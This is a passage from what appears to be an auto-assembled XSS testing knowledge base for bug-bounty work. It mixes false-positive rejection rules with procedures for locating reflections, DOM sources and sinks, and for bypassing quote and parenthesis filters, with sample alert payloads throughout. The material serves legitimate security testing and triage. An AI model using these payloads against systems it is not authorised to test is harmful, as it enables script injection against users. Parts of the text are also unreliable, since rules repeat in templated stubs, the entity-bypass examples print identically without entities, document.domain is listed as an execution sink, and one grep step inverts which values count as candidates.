*Disproof:* The candidate is a real DOM XSS if the identical tainted value, in the identical code path, is also passed to an execution-capable sink - innerHTML/outerHTML/insertAdjacentHTML/document.write/eval/string setTimeout - anywhere the same value can reach on another page load, in a fallback branch, or for a different input shape. This rule is also wrong if setAttribute's attribute NAME is derived from the same tainted input (setAttribute(t, v) where t is user-influenced), because OWASP limits setAttribute's safety to hardcoded, innocuous attribute names; an injected name such as onmouseover re-creates an injection sink.

**Reject a stored XSS candidate when the submitted payload never appears in any response served to another user or role, because a store-only write with no second-user render is not cross-site script execution.**

Why it looks vulnerable: you POST a payload to a comment field or a profile name, it comes back in the response to YOUR own request with a 200, and the marker persists when you reload - so persistence plus reflection looks like stored XSS and a CVSS vector is already chosen. The missing half is the victim.
The mechanism: stored (second-order) XSS arises when an application receives data from an untrusted source and later includes that data in its responses in an unsafe way; the defining property is that the exploit is self-contained inside the application, with the attacker placing the exploit and then simply waiting for users to encounter it. The exit points that matter are all possible HTTP responses returned to any kind of application user in any situation - not just your own. If the value only ever renders on the page the submitter is looking at (an inline confirmation, a private draft preview, a field redisplayed in the same response that submitted it), no other user ever receives the markup, no cross-user execution happens, and the correct classification is missing output encoding on a self-viewing response - at most a reflected XSS against yourself, i.e. self-XSS.
Exactly what observation kills it: after the payload is stored, enumerate every consumer of that data - list views, search results, admin dashboards, notification emails, API exports, PDF/CSV renders, other users' profile pages - and fetch each one as a DIFFERENT authenticated user (a low-privilege account viewing an admin view, and vice versa). If the marker is absent from every response other than the submitter's own, and there is no queue, export, email or webhook that carries it to a second party, the stored-XSS claim fails. If you find one response carrying the raw marker to another user, this rule is wrong and you have a real stored XSS - name that consumer in the report.

*Disproof:* The rule is wrong if any second surface renders the stored value - an admin moderation queue, a different user's listing or profile page, a notification email, an export/CSV/PDF generator, a webhook payload or a third-party integration that re-renders the string as HTML. Any one of those makes it genuine stored XSS, because the hunter now has two distinct steps: store, then a second user's response executes it.

**A value that reaches a page only through a client-side template's escaped interpolation or attribute binding is not XSS, because the framework assigns it through textContent/setAttribute rather than by string-concatenating it into markup.**

The classic false positive is a reflected parameter that appears un-escaped in a raw HTTP response body but is in fact passed through a template engine that escapes it before insertion. Vue makes the mechanism explicit: interpolation of a user string yields escaped output, and the escaping is done with native browser APIs rather than string surgery, so a payload that closes a tag or adds an event handler is neutralised by the assignment itself. A hunter who reads the raw response and concludes 'the tag is unescaped, therefore XSS' is reading a pre-template artefact. The field test is to determine whether the value's final insertion goes through a text node or attribute assignment, or through an HTML-string sink; only the latter is a finding. Note the corollary: the same framework is unsafe the moment the value reaches a sink that takes an HTML string.

*Disproof:* The rule is wrong the moment the value is also passed to a raw-HTML sink on the same render path (v-html, innerHTML, a markdown-to-HTML renderer, a server-side {{ triple-brace or |safe filter) - the framework's escaping applies only to the escaped bindings, and one raw sink is enough. It is also wrong if the value is echoed into a context the template engine does not own at all, such as a JSON blob later read by another script and written to a sink, or a value concatenated into an inline <script> block. Finally it is wrong if the app is not the framework it appears to be on some route - a JSON API or a server-rendered fragment served outside the template engine lands the string in raw HTML.
**Hypothesis:** Cookie theft via reflected XSS on an authenticated settings page
- Invalidated by: The session cookie carried HttpOnly, so document.cookie returned nothing — but the script could still read the page's CSRF token and submit the password change with it, which is the real impact
- **Rejection rule:** Never price XSS as cookie theft until you read the cookie flags; with HttpOnly the finding is in-origin privileged action, which is usually higher impact anyway

**Hypothesis:** Reject a report's 'steals session cookies' impact claim when the session cookie carries the HttpOnly attribute, and restate the impact as in-origin action on behalf of the victim instead.
- Invalidated by: The rule is wrong if the session cookie lacks HttpOnly and document.cookie returns it to injected script, in which case full session replay IS achievable and the original impact claim stands. It is also wrong when the sensitive credential is not the cookie at all - a JWT or API token in localStorage or sessionStorage, or a CSRF token readable from the DOM, is unaffected by HttpOnly. Read the Session Management cheat sheet's own warning before assuming HttpOnly helps: it only protects the confidentiality of that one cookie.
- **Rejection rule:** Reject a report's 'steals session cookies' impact claim when the session cookie carries the HttpOnly attribute, and restate the impact as in-origin action on behalf of the victim instead.

**Hypothesis:** Reject a DOM or reflected XSS candidate when the live page ships a CSP whose script-src carries a nonce or hash source without unsafe-inline and without strict-dynamic, because your injected inline script and inline event handlers cannot execute.
- Invalidated by: The rule is wrong when the policy contains 'unsafe-inline' (or 'unsafe-eval' for eval-style payloads), or when strict-dynamic is present and the injection point runs on a page that already loaded a nonced/hash-trusted script - in both cases a nonce-less injected script is executed anyway and the finding is a full XSS. It is also wrong if the CSP is only a report-only header (Content-Security-Policy-Report-Only), which logs violations without blocking anything.
- **Rejection rule:** Reject a DOM or reflected XSS candidate when the live page ships a CSP whose script-src carries a nonce or hash source without unsafe-inline and without strict-dynamic, because your injected inline script and inline event handlers cannot execute.

**Hypothesis:** Reject a DOM clobbering or prototype-pollution XSS candidate when the clobbered or polluted property is only read as a string into textContent, an attribute or a URL fetch, and never reaches an HTML parser or script-execution context.
- Invalidated by: The rule is wrong if the clobbered or polluted property is later assigned into an HTML-executing sink - a clobbered script src/iframe src whose value navigates to attacker markup, or a polluted property consumed by a template that renders it as HTML - because that is script execution with an injection-only primitive, and it is a real XSS. OWASP's own note that CSP mitigates clobbering of script sources but not already-present code that can be abused for execution is the same distinction seen from the mitigation side.
- **Rejection rule:** Reject a DOM clobbering or prototype-pollution XSS candidate when the clobbered or polluted property is only read as a string into textContent, an attribute or a URL fetch, and never reaches an HTML parser or script-execution context.

**Hypothesis:** Reject a reflected XSS candidate when the reflected value appears in the response only as HTML entities or percent/unicode escapes that the browser decodes back to inert text in that context, because encoding is what makes the reflection non-exploitable.
- Invalidated by: The rule is wrong if the encoding is applied for the wrong context - for example only HTML-entity-encoded output dropped inside a JavaScript string, a URL, a CSS value or an unquoted attribute, where &quot; and &#39; do not neutralise a quote delimiter and a ';alert(1)// payload still breaks the string. It is also wrong if the entity is decoded and re-serialised anywhere before rendering (a client-side read of .innerHTML followed by a re-write, or a client-side template that re-interprets the text as HTML), because then the inert text becomes live markup.
- **Rejection rule:** Reject a reflected XSS candidate when the reflected value appears in the response only as HTML entities or percent/unicode escapes that the browser decodes back to inert text in that context, because encoding is what makes the reflection non-exploitable.

**Hypothesis:** Reject a JSON API endpoint reported as XSS when the response Content-Type is application/json and no client-side code path inserts the reflected value into an HTML document.
- Invalidated by: The rule is wrong if the same reflected value reaches an HTML-executing context through any code path: the API is called by a front end that assigns the response into innerHTML or a framework's raw-HTML binding, the endpoint is reachable at the same path with a text/html or JSONP callback content type, or the server renders the stored value into an HTML page for other users. Then the JSON body is only the delivery mechanism, and the finding is a genuine XSS located at the sink.
- **Rejection rule:** Reject a JSON API endpoint reported as XSS when the response Content-Type is application/json and no client-side code path inserts the reflected value into an HTML document.

**Hypothesis:** Reject a prototype-pollution finding reported as XSS unless the polluted property value is read back and written into an HTML-executing sink, because polluting Object.prototype alone executes no script in any page.
- Invalidated by: The rule is wrong if the polluted property is consumed by a templating engine or a client-side render that inserts it as markup - a server-side template interpolating the inherited property, or front-end code writing it to innerHTML or a raw-HTML framework binding - because then the pollution is the injection primitive and the result is stored XSS reachable by every user of the app. Equally, if the pollution reaches a code-execution gadget (a template engine option object, a child-process invocation), that is RCE, which is a stronger finding than the XSS report claimed.
- **Rejection rule:** Reject a prototype-pollution finding reported as XSS unless the polluted property value is read back and written into an HTML-executing sink, because polluting Object.prototype alone executes no script in any page.

**Hypothesis:** A reflected XSS on an anonymous, read-only page is not automatically informational; it still executes script in every visitor's origin.
- Invalidated by: The page's origin exposes no authenticated state, no same-origin privileged endpoints and no tokens reachable from injected script, leaving only a bare popup.
- **Rejection rule:** A reflected XSS on an anonymous, read-only page is not automatically informational; it still executes script in every visitor's origin.

**Hypothesis:** Reject a sanitizer-bypass XSS claim when the rendered page shows the payload as inert text with the dangerous markup stripped, because a payload that does not become live DOM in the browser is not a bypass.
- Invalidated by: The rule is wrong if a real element with a live event handler or a navigable javascript:/data: URL is present in the rendered DOM and your callback endpoint receives the request - that is a genuine sanitizer bypass and a real XSS, even if the sanitizer appeared to strip <script>. The rule also does not apply where the string is sanitized and then mutated or re-serialised before insertion, since the protection can be voided downstream; check the sink, not the sanitizer call.
- **Rejection rule:** Reject a sanitizer-bypass XSS claim when the rendered page shows the payload as inert text with the dangerous markup stripped, because a payload that does not become live DOM in the browser is not a bypass.

**Hypothesis:** Reject an XSS candidate as unproven when the payload can only be made to render by pasting attacker-supplied JavaScript into the submitter's own address bar or console, because that is self-XSS and not a cross-user finding.
- Invalidated by: The candidate stops being self-XSS the moment a working delivery exists: a crafted URL (or a CSRF-style auto-submitting form) that fires the payload automatically in any other user's browser, on a page an authenticated victim visits. Then it is ordinary reflected XSS and this rejection rule is wrong. Equally, if the 'pasting' step is not required because the value is stored and later rendered to other users, the finding is stored XSS, not self-XSS.
- **Rejection rule:** Reject an XSS candidate as unproven when the payload can only be made to render by pasting attacker-supplied JavaScript into the submitter's own address bar or console, because that is self-XSS and not a cross-user finding.

**Hypothesis:** Reject a DOM-based XSS candidate when the traced attacker-controlled source only ever reaches textContent, innerText, or setAttribute with a hardcoded non-event attribute, because those sinks treat the value as text and never parse it as markup.
- Invalidated by: The candidate is a real DOM XSS if the identical tainted value, in the identical code path, is also passed to an execution-capable sink - innerHTML/outerHTML/insertAdjacentHTML/document.write/eval/string setTimeout - anywhere the same value can reach on another page load, in a fallback branch, or for a different input shape. This rule is also wrong if setAttribute's attribute NAME is derived from the same tainted input (setAttribute(t, v) where t is user-influenced), because OWASP limits setAttribute's safety to hardcoded, innocuous attribute names; an injected name such as onmouseover re-creates an injection sink.
- **Rejection rule:** Reject a DOM-based XSS candidate when the traced attacker-controlled source only ever reaches textContent, innerText, or setAttribute with a hardcoded non-event attribute, because those sinks treat the value as text and never parse it as markup.

**Hypothesis:** Reject a stored XSS candidate when the submitted payload never appears in any response served to another user or role, because a store-only write with no second-user render is not cross-site script execution.
- Invalidated by: The rule is wrong if any second surface renders the stored value - an admin moderation queue, a different user's listing or profile page, a notification email, an export/CSV/PDF generator, a webhook payload or a third-party integration that re-renders the string as HTML. Any one of those makes it genuine stored XSS, because the hunter now has two distinct steps: store, then a second user's response executes it.
- **Rejection rule:** Reject a stored XSS candidate when the submitted payload never appears in any response served to another user or role, because a store-only write with no second-user render is not cross-site script execution.

**Hypothesis:** GET /search returns the q parameter unencoded in the HTML body
- Invalidated by: The response was served as application/json and the page inserted it via textContent, so the injected markup was parsed as text and never became nodes
- **Rejection rule:** Reflection is not execution: confirm the response is parsed as HTML and that the value reaches an execution-capable sink before calling it XSS

## Validation

**A page that handles postMessage without validating event.origin accepts attacker-controlled input from any origin.**

postMessage is a controlled way to talk across origins, but the safety is entirely in the receiver's check. The finding is a receiver that acts on event.data without comparing event.origin against an expected allowlist, typically inside an addEventListener('message', ...) handler. Confirm it by hosting a page on your own origin that posts a message to the target window and observing the privileged action. The mirror-image bug is a receiver that trusts data because the sender frame is same-origin — the origin check still belongs in the handler.

*Disproof:* This is wrong if the handler verifies event.origin against an exact expected origin before acting, or if the data is only used in a context that cannot reach a sink or a privileged action.

**A reflected XSS on a page whose CSP is nonce-based is only exploitable if the injected markup executes on that same page and inherits its policy; a payload delivered on a page with no CSP header, or a different policy, is not covered by the nonce argument.**

Nonce-based CSP is a strong control and it is also the most common reason a confirmed-looking XSS report gets closed. The mechanism is that the policy names one specific inline script by hash of a per-response random value, and every other inline script without that value is refused. CSP3's 'strict-dynamic' source expression extends this: it trusts script which already executes to load more script via non-parser-inserted script elements, so an attacker who gets one nonce-bearing script in still wins - which is why nonce policies are judged on whether the nonce itself is injectable. The hunter's obligation is to state precisely which header and which document the proof ran under. A payload echoed by an API endpoint with no CSP, or by an error page, or by a file-serve route, inherits no nonce and no policy - the 'CSP blocks it' closure only holds for the exact response you observed the header on. Report the header verbatim alongside the request and response pair.

*Disproof:* The claim is false if the policy uses 'strict-dynamic' together with a host allow-list, because a single executed script then loads arbitrary further script without needing the nonce again. It is also false if the nonce value is itself attacker-influenced - reflected in the page, derived from a predictable or reused value, or set on a script the attacker controls - since the whole policy then collapses to allowing that script. And a policy that omits default-src or leaves script-src unset inherits the permissive default, so no nonce is being enforced in the first place. Finally the argument is void if the vulnerable response carries no Content-Security-Policy header at all.

**If a DOM source value is URL-encoded before reaching the sink the markup payload cannot survive, making the candidate a false positive.**

When a DOM XSS attempt fails silently, check whether the source string is percent-encoded in transit (encodeURIComponent, or native browser encoding of location.search and location.hash in Chrome, Firefox and Safari). Re-test with characters that are not percent-encoded, or trace the decode step in the code path, before closing the candidate as non-exploitable.

*Disproof:* A non-encoded payload with no percent sequences in the traced value reaches the sink and executes script in the victim's browser.

**An escape routine that is correct for one context does not protect another, so a finding is wrong until the encoding is shown to match the exact context the value lands in.**

OWASP requires a different encoding per destination: HTML attribute encoding for attributes, \xHH for JavaScript contexts, %HH for URLs, and URL encoding followed by HTML attribute encoding when a URL is placed in an href or src. Output that is encoded for one context and then consumed in another is the mechanism behind most missed XSS, and the encoding looks correct in review while doing nothing at the sink. Confirm the encoding applied matches the context where the value actually lands — for a JSON endpoint that means the Content-Type is application/json rather than text/html.

*Disproof:* This is wrong if the value is context-correctly encoded by a vetted encoder for its exact destination, or if it is inserted as a property value on a sink that encodes automatically.

**An HttpOnly session cookie removes the cookie-exfiltration chain, so impact must be restated as in-origin actions rather than session theft.**

Inspect Set-Cookie for the session identifier and check the HttpOnly attribute. If present, document.cookie cannot read it, so a steal-the-cookie-and-replay proof of concept is impossible. Rescope the finding to what injected script can still do in-origin: read the DOM, call authenticated APIs, capture auto-filled credentials, and report that reduced chain honestly rather than claiming account takeover.

*Disproof:* The session cookie lacks HttpOnly and document.cookie returns it inside the injected script, so full session replay is achievable.

**A payload that fires an alert only in the hunter's own browser demonstrates script execution but not a reportable vulnerability, because impact requires the payload to reach another user's session or a reachable victim path.**

Step: separate your PoC into two observations. Observation A (execution): a unique alphanumeric marker or alert fires in your own authenticated session, proving the sink. Observation B (reportability): the same payload is delivered to a page another user will load, or you demonstrate the same-origin action it enables. A write-up resting on observation A alone is a curiosity: it proves nothing about another user's session, and the popup is only a proof mechanism, not the vulnerability. Observation that clears the bar: a marker rendered in a second session's page load, or a completed state-changing request issued from injected script. If you cannot produce B, report it as an unconfirmed execution sink rather than an impact claim.

*Disproof:* If the payload demonstrably renders and executes in a second, independently authenticated session or in a view reached by another user, then the marker is not self-only and the finding does clear the bar.

**To decide this case, observe: Step: separate your PoC into two observations. Observation A (execution): a unique alphanumeric marker or alert fires in your own authenticated session, proving the sink.**

Derived from xss.validation.self_fired_marker_is_not_a_reportable_finding, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (xss.validation.self_fired_marker_is_not_a_reportable_finding) states the full boundary.

**When a filter blocks your quote or tag characters, probe the decoder gap in a fixed order - HTML-entity-encode the blocked character first, then prepend a backslash to neutralise the app's own escaping - and a hit proves the filter normalises but does not neutralise.**

PROCEDURE. Fix the order; do not improvise payloads. (1) Send the plain payload ';alert(document.domain)// and record EXACTLY what came back. The transformation is the intelligence: unchanged means no filter; '; means quotes are stripped; \'; means quotes are backslash-escaped; &#39; means HTML-entity-encoded; %27 means URL-encoded; missing entirely means a denylist matched the string.
(2) HTML-ENTITY PROBE. If the landing context is a quoted tag attribute (onclick=, onerror=, onmouseover=) or any attribute value the browser HTML-decodes before use, replace the blocked quote with its entity: '-alert(document.domain)-' and '-alert(document.domain)-'. The browser decodes the attribute value BEFORE the JavaScript is parsed, so the entity becomes a real string delimiter. Also try decimal/hex forms the filter may miss: &#39; / &#x27; and the unterminated variants &#39 and &#x27 without the trailing semicolon.
(3) BACKSLASH-BEFORE-QUOTE PROBE. If the app escapes quotes by prefixing a backslash WITHOUT escaping the backslash itself, send \';alert(document.domain)//. The app turns your backslash into \', leaving the quote unescaped and terminating the string. Test this whenever step 1 returned \'.
(4) Confirm each surviving candidate in the browser (alert(document.domain)) before calling it a bypass. FAILURE = the app encodes for the exact context it lands in and the browser decodes it back to inert text; record the field as encoded-safe-for-this-context rather than continuing to fuzz.

*Disproof:* The procedure is wrong if the entity probe is fired at the wrong layer: &#39; only helps where the browser HTML-decodes before parsing, so sending it into a JS string inside a <script> block, into a URL, or into a CSS value does nothing, and a hunter who treats a non-firing entity probe as proof of safety has only tested one decoder. It is also wrong to stop at the first working bypass - the same filter may have a second gap, and reporting only the first understates the defect.

**When a filter blocks parentheses you switch to a parentheses-free invocation, and when the reflection lands inside backticks you use ${...} with no terminator at all - both are determined by what step 1 showed you in the response.**

PROCEDURE. (1) Read the context first; this procedure only applies where it applies.
(2) PARENTHESES BLOCKED (response shows alert(1) or alert(1) stripped/emptied): stop trying to call functions with (). Use an invocation that passes the argument without parentheses - the classic form assigns the function to the global exception handler and throws to it: onerror=alert;throw 1 . The handler receives the thrown value, so alert is called with 1. Other parentheses-free forms: [``]${alert`1`} , and eval of a fromCharCode-built string when even quotes are blocked: eval(String.fromCharCode(...)). Verify the string/no-quote constraint before choosing the fromCharCode route.
(3) TEMPLATE LITERAL (response shows the marker inside backticks, e.g. var input = `MARKER`;): do NOT try to close the backtick and do not send a quote. Send ${alert(document.domain)}. The ${...} is evaluated as a JavaScript expression when the literal is processed, so it fires with no terminator and no syntax repair. If backslash-escaping is also applied inside the literal, send \${...} style prefixes only after observing the app's own escaping in step 1.
(4) Re-run step 1's transformation read on each of these payloads before going to the browser - an entity- or backslash-transformed payload needs the matching bypass from the sibling probe sequence first. SUCCESS = an observable effect in a real browser. FAILURE = the value is transformed into inert text in the landing context.

*Disproof:* The procedure is wrong if the marker lands in a template literal that is never actually evaluated as a tagged/interpolated expression at runtime (a string built for display, or a literal inside a JSON blob parsed as data) - ${...} then stays literal text and you will have burned the window on the wrong technique. It is also wrong to assume parentheses-free invocation survives everywhere: onerror=alert;throw 1 needs an element that fires error, so on a non-error context the payload is inert and the miss is a context error, not proof the filter holds.

**Reading the characters immediately before and after each reflection point tells you which of the six XSS contexts you are in, and the context selects the payload family, so no payload should be tried before the context is named.**

PROCEDURE. (1) Take the raw response containing the marker and jump to each offset where it appears. (2) Read 80 characters to the LEFT and 80 to the RIGHT of the marker and name the context exactly:
  - BETWEEN TAGS: marker sits in element text content, e.g. <p>MARKER</p>. Payloads must introduce a new tag: <img src=x onerror=alert(document.domain)> or <svg onload=alert(document.domain)>.
  - QUOTED ATTRIBUTE: marker sits inside ="..." or ='...'. Payloads must terminate the attribute, add an event handler, and repair the markup: " autofocus onfocus=alert(document.domain) x=".
  - UNQUOTED ATTRIBUTE: marker sits in href=MARKER. First probe whether a space or a quote is even needed; if quotes are allowed, terminate the attribute as above.
  - URL ATTRIBUTE: marker is the value of href/src/action on a real element. Do not try tag injection first - probe the javascript: pseudo-protocol directly, e.g. javascript:alert(document.domain).
  - INSIDE A <script> BLOCK, between quotes: marker sits inside '...' or "...". Payloads must close the string AND repair the remainder of the script: ';alert(document.domain)// or '-alert(document.domain)-'. The trailing repair is mandatory; a bare ';' leaves an unterminated literal and kills the whole script.
  - INSIDE A TEMPLATE LITERAL: the delimiters are backticks, not quotes. Payloads do not terminate anything: ${alert(document.domain)}.
(3) Also record any transformation the app applied to the marker before output: HTML-entity encoding (&lt;), URL encoding (%3C), stripping of < > " ' or \ , or truncation with an ellipsis. The transformation tells you which bypass family is in scope in the next step.
FAILURE = you cannot name the context from the surrounding bytes, which means you are guessing. Widen the window until you can see the opening delimiter.

*Disproof:* The procedure is wrong if a single reflection is genuinely multi-context - the same marker echoed into a hidden input AND an inline script AND a data attribute - because naming one context hides the others; you must enumerate every offset, not the first one found. It is also wrong where the payload family is chosen but the surrounding markup makes it inert: a marker inside a <title>, inside an HTML comment, inside a <textarea>, or inside an already-escaped attribute with no decode step later. Those require a different escape, not a context-specific payload.

**Before writing an impact claim, read the live response headers for the CSP nonce/hash/strict-dynamic directives, the HttpOnly flag on the session cookie, and any require-trusted-types-for directive, because each one caps what your confirmed execution can actually do.**

PROCEDURE. Run this immediately after execution is confirmed and BEFORE drafting impact. (1) Read the Content-Security-Policy response header on the exact page that executed the payload (not the site root, not a cached copy). Classify script-src: (a) a per-response nonce ('nonce-...') that differs on every page load means inline injected script without that nonce is blocked; (b) a hash list ('sha256-...') means only byte-identical scripts run; (c) strict-dynamic means script trust propagates from already-trusted scripts, so an injected tag alone will not execute even with a broad host allowlist; (d) 'unsafe-inline' or a bare host allowlist means CSP is not stopping inline execution. Then test it rather than assume: load the payload page and read the console for the CSP violation message, and check whether the script actually ran.
(2) Read Set-Cookie on the login/session response and confirm HttpOnly is present on the session cookie. If it is, document.cookie from injected script will NOT return it - drop the 'steals session cookies' claim and restate impact as in-origin actions on behalf of the victim. If it is absent, the cookie-theft chain is intact and stays in the report. Check localStorage/sessionStorage and DOM-readable CSRF tokens separately: HttpOnly does nothing for those.
(3) Check for require-trusted-types-for 'script' in the CSP. If present, assigning a plain string to innerHTML/outerHTML/document.write/script.src throws a TypeError unless it is a Trusted Type from an allowed policy - which is why a DOM-sink payload may silently do nothing. Confirm by watching for the TypeError, and check whether the trusted-types directive allowlists a 'default' policy that silently sanitises instead.
FAILURE of the check = you cannot read a CSP at all. That is NOT proof there is none: check meta-delivered CSP and a report-uri/report-to header, then treat inline execution you actually witnessed as proof the control did not stop you.

*Disproof:* The procedure is wrong if you treat a nonce you observed on one page load as a permanent value and paste it into a payload - a nonce is regenerated per response, so a captured nonce will not match and the test fails for the wrong reason. It is also wrong to conclude a control blocks impact from the header alone: nonce/hash/strict-dynamic govern script execution, not already-confirmed event-handler execution through a parsed HTML node in every policy, and HttpOnly says nothing about tokens held in localStorage.

**Grepping a downloaded JS bundle for the concrete sink token set - innerHTML, outerHTML, insertAdjacentHTML, document.write/writeln, eval, new Function, setTimeout/setInterval with a string first argument, and the jQuery html/append family - is what converts 'this page uses innerHTML somewhere' into a list of lines you can actually test.**

PROCEDURE. (1) Download every script the target actually loads (view-source the HTML for <script src>, then fetch each bundle; include inline <script> blocks by saving the page). Do not test a minified single-line bundle by eye. (2) Run one grep per sink pattern over the saved files, with line output so you get offsets:
  - innerHTML / outerHTML          (HTML sinks; script tags will NOT execute here, so pivot to <img onerror> or <svg onload>)
  - insertAdjacentHTML             (second HTML sink, often missed)
  - document.write / document.writeln / document.domain (script-execution sink)
  - eval(                          (execution sink)
  - new Function(                   (execution sink; often minified to a short alias)
  - setTimeout( / setInterval( with a QUOTED first argument - a string argument is an execution sink, a function argument is not; check the quote character before you count it
  - jQuery: .html( .append( .prepend( .after( .before( .replaceWith( .wrap( .insertAfter( .insertBefore( .add( .animate( .has( .constructor( .init( .index( jQuery.parseHTML( $.parseHTML(
(3) For every hit, read 3-5 lines of surrounding context to decide whether the value reaching the call is attacker-controllable (a URL source, a postMessage handler, a stored field) or a hardcoded string. Only the second class is a candidate. (4) Minified code defeats plain grep: if a bundle is one line, reformat it (node --print or any beautifier) before grepping, and grep for the assignment target of short aliases as well. FAILURE = zero hits across all patterns: the sinks are then in a bundle you did not download (lazy-loaded chunk, inline eval'd config, server-rendered template) - fetch the remaining chunks before concluding.

*Disproof:* The procedure is wrong if the sink token appears in dead code, a comment, a minifier artifact, or an error-handling branch that never runs - a raw grep hit is a candidate list, not a vulnerability, and a hit list with no reachability analysis will generate false positives. It is also wrong as a completeness claim: many apps reach sinks through a framework abstraction (a template engine's {{{ }}} escape, a v-html directive, React's dangerouslySetInnerHTML) where the literal token never appears in any bundle.

**For DOM XSS you must seed the marker into a client-side source such as location.search and locate it in the live DOM with devtools Control+F, because the browser's View Source never shows JavaScript-injected nodes.**

PROCEDURE. (1) Identify candidate client-side sources before typing anything: location.search, location.hash, location.href, document.URL, document.referrer, document.cookie, document.title, localStorage/sessionStorage values, and postMessage data. (2) Seed a marker into the source under test - e.g. navigate to https://target/page?zx7q1mba and https://target/page#zx7q1mba - and note that Chrome, Firefox and Safari URL-encode location.search and location.hash while IE11 does not, so the marker you typed may not be the marker in the DOM; search for the raw string AND for its percent-encoded form. (3) Open devtools and use Control+F (Cmd+F on macOS) to search the LIVE DOM. Do NOT use View Source: it shows the server's bytes and cannot show nodes created or mutated by JavaScript, so a DOM-only sink will look absent there even when it is live. (4) At every hit, name the context from the surrounding markup and then refine: if the marker is inside a double-quoted attribute, next probe is a double quote to test whether you can terminate the attribute; if it is in text content, probe <img src=x onerror=alert(document.domain)>. (5) Record which source fed which node. FAILURE = the marker is absent from the live DOM. Then the source is not reaching that sink; move to the execution-sink procedure, because execution sinks never render the value in the DOM and cannot be found this way at all.

*Disproof:* The procedure is wrong if the app renders the marker only after an interaction or a timer - a click, a scroll, a setTimeout, a route change - because a single load-time Control+F finds nothing and the source IS reachable. It is also wrong where the value is passed to an execution sink such as eval or setTimeout-with-string, where the marker legitimately never appears in the DOM, so 'absent from the DOM' is not evidence of safety and must not be recorded as a clean result.

**A DOM XSS claim is only proven when the debugger shows an actual value flowing from a source read into an execution sink, because grepping source and sink names separately proves nothing about the path between them.**

PROCEDURE. (1) In devtools, use Control+Shift+F (Cmd+Alt+F on macOS) to search ALL page JavaScript for each source token: location, document.URL, document.referrer, document.cookie, location.hash, location.search, window.name, postMessage/onmessage. Note every line that READS a source. (2) Set a breakpoint on each read. Reload the page with your marker in the source (e.g. #zx7q1mba). (3) When the breakpoint hits, hover the value in the Scope panel to confirm it actually carries your marker. If the variable is empty, your source is not actually attacker-reachable on this path - go back to step 1. (4) Now Step Over line by line and watch where the value goes. If it is assigned to a new variable, set a second breakpoint on that assignment and repeat - taint usually hops through several names. (5) Continue until you reach a sink from your enumeration list. At the sink call, hover the argument and confirm it still equals your marker. SUCCESS = debugger evidence that the marker value arrives at the sink, plus browser execution in the same session. FAILURE = the source read yields a value you cannot set, or the chain terminates in a safe sink (textContent, value, className, setAttribute with a fixed name) - record it as traced-and-safe so it is never re-tested.

*Disproof:* The procedure is wrong if the path is data-dependent and your single marker run takes a different branch than the attacker's input would (a length check, an if/else on the first character, a try/catch). A clean debugger trace on one marker does not prove the branch an attacker's payload would take is also safe. It is also wrong to stop at the first sink: a value often flows into a safe sink AND an unsafe sink, so the trace must continue to every use of the tainted variable.

**A short unique alphanumeric marker echoed verbatim in the response, from every request-controlled entry point tested one at a time, is the pass condition that proves reflection exists before any payload is chosen.**

PROCEDURE. (1) Build the entry-point list for one request type: every query parameter, every body field (form post, JSON key, multipart part), every path segment, and each header that a real browser controls (Referer, User-Agent, Accept-Language, X-Forwarded-For only if the app trusts a proxy). Do not skip the file path - it is a distinct sink surface from the query string. (2) Send ONE marker per request, not several: e.g. GET /search?q=zx7q1mba and, separately, GET /u/zx7q1mba with the same value. Roughly 8 alphanumeric characters, lower/upper mix, no punctuation - short so validation/regex/length filters let it through, long enough that an accidental match is implausible. (3) Search the RAW response body for the exact string, then the response headers separately. Success = the marker appears byte-for-byte at least once. Record every offset, because one parameter often reflects in two or more places with different contexts. (4) Re-issue the identical request without the marker to confirm the marker is not a static string already in the page (CSRF tokens, build hashes, cache-buster IDs are the usual false positives). (5) Classify each hit: REFLECTED (present in the immediate response to the request that carried it), STORED (absent now, appears in a later response to a different request), or NONE. FAILURE = the marker is absent, or present only URL-encoded/HTML-entity-encoded, or only in a Set-Cookie/header where a browser will not execute it. Record entry points where the marker never appears; they are ruled out for this run and must not be re-tested with payloads.

*Disproof:* The procedure is wrong if the marker reflects yet no XSS is reachable - that is a real possibility the method cannot detect: the reflection may sit inside a comment, inside an HTML entity-encoded attribute the app later re-decodes and re-renders on another page, or inside a JSON field that a second script writes into innerHTML on a different route. It is also wrong if the 'static string' control is insufficient, because an app that echoes a per-session value (a CSRF token built from your marker, a request-id cache) will pass step 4 and still tell you nothing about general reflection.

**A payload only counts as XSS once a real browser parses the delivered page and the injected JavaScript actually runs; a payload visible in Repeater's response pane is unexecuted source text, not a finding.**

PROCEDURE. (1) Take the exact request that produced the working payload in Repeater. Do not hand-retype the URL - copy the raw request, keep every cookie and header. (2) Deliver it to a real browser by one of: pasting the full URL with the payload still URL-encoded into the address bar; or letting Burp Proxy intercept, editing the request there, and forwarding to the browser; or replaying the saved request file with a tool that opens the resulting URL in a normal profile. (3) Use a proof payload that produces an unambiguous, observable side effect you can see without devtools: alert(document.domain) is the default because the popup names the origin it ran in. If popups are blocked, use a payload that mutates the page instead, e.g. document.title='XSS-PROOF-9137' or document.body.innerHTML='pwned'. (4) Read the verdict off the browser, not the proxy: did the dialog appear? did document.title change? (5) For a stored case, load the exit-point page in a browser session that is NOT the submitter's. FAILURE = no observable effect in the browser even though the payload text is present in the response. That means the payload was neutralised, it landed in a non-executing context, or a control (CSP/Trusted Types) blocked it - record it as not-reproduced, not as a finding.

*Disproof:* The procedure is wrong if a payload executes with no visible trace you chose to look for - e.g. the proof writes to a network beacon instead of the DOM, so 'no alert' reads as failure when execution actually happened. It is also wrong to require a visible popup as the sole gate: CSP report-only mode, Trusted Types default policies, and headless profiles can all suppress alert() while script still runs. Confirm with a second, independent observable (network egress, DOM mutation, console log) before calling it a failure.

**To decide this case, observe: When a value is reflected into a scriptable attribute such as onclick and the filter blocks the quote character, HTML-encoding it works around the filter.**

Derived from xss.bypass.filter.html_entity_decoding_of_attribute_values, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (xss.bypass.filter.html_entity_decoding_of_attribute_values) states the full boundary.

